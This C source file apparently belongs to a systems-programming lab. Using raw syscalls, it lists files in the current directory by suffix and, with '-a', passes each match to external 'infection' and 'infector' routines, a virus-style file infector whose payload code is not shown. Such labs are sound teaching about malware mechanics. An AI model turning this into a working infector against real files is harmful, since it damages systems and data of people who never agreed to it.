#include "util.h"

#define SYS_WRITE 4
#define SYS_READ 3
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define SYS_EXIT 1
#define SYS_GETDENTS 141
#define O_RDWR 2
#define O_RD 0
#define O_WR 1
#define O_CREATE 64
#define EOF -1
#define stdin 0
#define stdout 1
#define stderr 2
#define BUF_SIZE 8192
#define DT_REG 8

extern void infection(void);
extern void infector(char *);

void fprint(int file, char* str) {
  system_call(SYS_WRITE, file, str, strlen(str));
}

void print(char* str) {
  fprint(stdout, str);
}

void printInt(int i) {
  fprint(stdout, itoa(i));
}

void quit_err(char *msg) {
  print(msg);
  system_call(SYS_EXIT, 55);
}

int fopen(char *file, int op) {
  int fileDesc = system_call(SYS_OPEN, file, op, 0777);

  if (fileDesc < 0) {
    quit_err("File open error\n");
  }

  return fileDesc;
}

int endsWith(char *str, char cmp) {
  char lastChar;
  int i = 0;

  while(*(str + i) != 0) {
    lastChar = *(str + i);
    i++;
  }

  if (lastChar == cmp){
    return 1;
  }

  return 0;
}

struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
		      /* length is actually (d_reclen - 2 -
			offsetof(struct linux_dirent, d_name)) */
    /*
    char           pad;       // Zero padding byte
    char           d_type;    // File type (only since Linux
			      // 2.6.4); offset is (d_reclen - 1)
    */
};

int main(int argc, char **argv) {
  int fd, nread;
  char buf[BUF_SIZE];
  struct linux_dirent *d;
  int bpos;
  char suffix;
  int i, isSuff = 0, toInfect = 0;
  char d_type;

  for(i=1; i<argc; i++){
    if(strcmp(argv[i], "-s") == 0) {
	suffix = argv[++i][0];
	isSuff = 1;
    }
    else if(strcmp(argv[i], "-a") == 0) {
	suffix = argv[++i][0];
	isSuff = 1;
	toInfect = 1;
    }
    else {
	print("invalid parameter\n");
	return 1;
    }
  }

  /*current dir*/
  fd = fopen(".", O_RD);

  while (1) {
      nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
      if (nread == -1)
	  quit_err("getdents");

      if (nread == 0)
	  break;

      for (bpos = 0; bpos < nread;) {
	  d = (struct linux_dirent *) (buf + bpos);

	  d_type = *(buf + bpos + d->d_reclen - 1);

	  if(isSuff && d_type == DT_REG && endsWith(d->d_name, suffix)) {
	    print(d->d_name);
	    print("\n");

	    if (toInfect) {
	      infection();
	      infector(d->d_name);
	    }
	  }
	  else if(!isSuff){
	    print(d->d_name);
	    print("\n");
	  }

	  bpos += d->d_reclen;
      }
  }

  return 0;
}
